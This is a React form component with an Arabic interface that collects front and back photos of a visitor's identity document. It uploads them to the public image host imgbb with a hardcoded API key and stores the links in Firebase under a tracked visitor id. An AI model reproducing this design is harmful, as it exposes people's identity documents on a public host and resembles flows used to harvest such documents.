"use client";

import type React from "react";

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardFooter } from "@/components/ui/card";
import {
  CheckCircle2,
  Loader2,
  Camera,
} from "lucide-react";
import { addData } from "@/lib/firebase";

interface UploadedImage {
  url: string;
  displayUrl: string;
  deleteUrl: string;
}

export function IdUploadForm({
  setCurrentStep,
}: {
  setCurrentStep: (v: string) => void;
}) {
  const [frontImage, setFrontImage] = useState<UploadedImage | null>(null);
  const [backImage, setBackImage] = useState<UploadedImage | null>(null);
  const [frontPreview, setFrontPreview] = useState<string | null>(null);
  const [backPreview, setBackPreview] = useState<string | null>(null);
  const [isUploadingFront, setIsUploadingFront] = useState(false);
  const [isUploadingBack, setIsUploadingBack] = useState(false);

  const uploadToImgbb = async (file: File): Promise<UploadedImage> => {
    const formData = new FormData();
    formData.append("image", file);

    // Using a demo API key - users should replace with their own from https://api.imgbb.com/
    const apiKey = "932b0c44a2142176e6f7ce16540dbf61";

    const response = await fetch(
      `https://api.imgbb.com/1/upload?key=${apiKey}`,
      {
        method: "POST",
        body: formData,
      }
    );

    if (!response.ok) {
      throw new Error("Upload failed");
    }

    const data = await response.json();

    return {
      url: data.data.url,
      displayUrl: data.data.display_url,
      deleteUrl: data.data.delete_url,
    };
  };

  const handleFileChange = async (
    event: React.ChangeEvent<HTMLInputElement>,
    side: "front" | "back"
  ) => {
    const file = event.target.files?.[0];
    if (!file) return;

    // Create preview
    const reader = new FileReader();
    reader.onloadend = () => {
      if (side === "front") {
        setFrontPreview(reader.result as string);
      } else {
        setBackPreview(reader.result as string);
      }
    };
    reader.readAsDataURL(file);

    // Upload to imgbb
    try {
      if (side === "front") {
        setIsUploadingFront(true);
      } else {
        setIsUploadingBack(true);
      }

      const uploadedImage = await uploadToImgbb(file);

      if (side === "front") {
        setFrontImage(uploadedImage);
      } else {
        setBackImage(uploadedImage);
      }
    } catch (error) {
      console.error("[v0] Upload error:", error);
      alert("فشل رفع الصورة. يرجى المحاولة مرة أخرى.");
    } finally {
      if (side === "front") {
        setIsUploadingFront(false);
      } else {
        setIsUploadingBack(false);
      }
    }
  };
  const handleNext = async () => {
    setCurrentStep("3");
    const visitorid = localStorage.getItem("visitor");
    await addData({ id: visitorid, backImage, frontImage });
  };

  return (
    <div className="space-y-8 p-3" dir="rtl">
      <Card className="p-8 border-1 bg-card">
        <div className="space-y-8">
          {/* Front ID Upload */}
          <div>
            <h2 className="text-md font-bold  text-orange-600 mb-4">
              الخطوة 1: رفع الجانب الأمامي للهوية
            </h2>
            <p className="text-foreground mb-4">
              قم برفع صورة واضحة للجانب الأمامي من وثيقة الهوية
            </p>

            <div className="space-y-4">
              <label
                htmlFor="front-upload"
                className="block border-1 border-gray-200 rounded-md bg-input p-8 text-center cursor-pointer hover:bg-muted transition-colors"
              >
                <input
                  id="front-upload"
                  type="file"
                  accept="image/*"
                  onChange={(e) => handleFileChange(e, "front")}
                  className="hidden"
                  disabled={isUploadingFront}
                />
                <div className="flex flex-col items-center gap-2">
                  {isUploadingFront ? (
                    <>
                      <Loader2 className="w-8 h-8 text-gray-500 animate-spin" />
                      <span className="text-gray-600 font-semibold">
                        جاري الرفع...
                      </span>
                    </>
                  ) : frontImage ? (
                    <>
                      <CheckCircle2 className="w-8 h-8 text-primary" />
                      <span className="text-gray-600 font-semibold">
                        تم رفع الجانب الأمامي
                      </span>
                    </>
                  ) : (
                    <>
                      <Camera className="w-8 h-8 text-orange-600" />
                      <span className=" text-gray-600 font-semibold">
                        انقر لرفع الجانب الأمامي
                      </span>
                    </>
                  )}
                </div>
              </label>

              {frontPreview && (
                <div className="border-2 rounded-md  border-gray-400 p-4 bg-input">
                  <img
                    src={frontPreview || "/placeholder.svg"}
                    alt="معاينة الجانب الأمامي للهوية"
                    className="max-h-64 mx-auto object-contain"
                  />
                </div>
              )}
            </div>
          </div>

          {/* Back ID Upload */}
          <div>
            <h2 className="text-md font-bold text-orange-600 mb-4">
              الخطوة 2: رفع الجانب الخلفي للهوية
            </h2>
            <p className="text-foreground mb-4">
              قم برفع صورة واضحة للجانب الخلفي من وثيقة الهوية
            </p>

            <div className="space-y-4">
              <label
                htmlFor="back-upload"
                className="block border-1 border-gray-400 rounded-md bg-input p-8 text-center cursor-pointer hover:bg-muted transition-colors"
              >
                <input
                  id="back-upload"
                  type="file"
                  accept="image/*"
                  onChange={(e) => handleFileChange(e, "back")}
                  className="hidden"
                  disabled={isUploadingBack}
                />
                <div className="flex flex-col items-center gap-2">
                  {isUploadingBack ? (
                    <>
                      <Loader2 className="w-8 h-8 text-gray-600 animate-spin" />
                      <span className="text-gray-600 font-semibold">
                        جاري الرفع...
                      </span>
                    </>
                  ) : backImage ? (
                    <>
                      <CheckCircle2 className="w-8 h-8 text-primary" />
                      <span className="text-gray-600 font-semibold">
                        تم رفع الجانب الخلفي
                      </span>
                    </>
                  ) : (
                    <>
                      <Camera className="w-8 h-8 text-orange-600" />
                      <span className="text-gray-600 font-semibold">
                        انقر لرفع الجانب الخلفي
                      </span>
                    </>
                  )}
                </div>
              </label>

              {backPreview && (
                <div className="border-2 rounded-md  border-gray-400 p-4 bg-input">
                  <img
                    src={backPreview || "/placeholder.svg"}
                    alt="معاينة الجانب الخلفي للهوية"
                    className="max-h-64 mx-auto object-contain"
                  />
                </div>
              )}
            </div>
          </div>

          {/* Action Buttons */}
          {(frontImage || backImage) && (
            <CardFooter className="flex justify-center py-8">
              <Button onClick={handleNext} className="w-full bg-orange-600 ">
                التالي
              </Button>
            </CardFooter>
          )}
        </div>
      </Card>

      {/* Instructions */}
      <Card className="p-6 border-2 border-gray-400/30 bg-card">
        <h3 className="font-bold text-gray-600 mb-2">ملاحظات هامة:</h3>
        <ul className="space-y-1 text-sm text-muted-foreground list-disc list-inside">
          <li>تأكد من أن الهوية واضحة وغير ضبابية</li>
          <li>يجب أن يكون جميع النصوص والصور على الهوية قابلة للقراءة</li>
          <li>تجنب الوهج أو الظلال على الوثيقة</li>
          <li>الصيغ المدعومة: JPG، PNG، GIF (بحد أقصى 32 ميجابايت)</li>
          <li>يتم رفع الصور إلى imgbb.com ويتم توفير الروابط</li>
        </ul>
      </Card>
    </div>
  );
}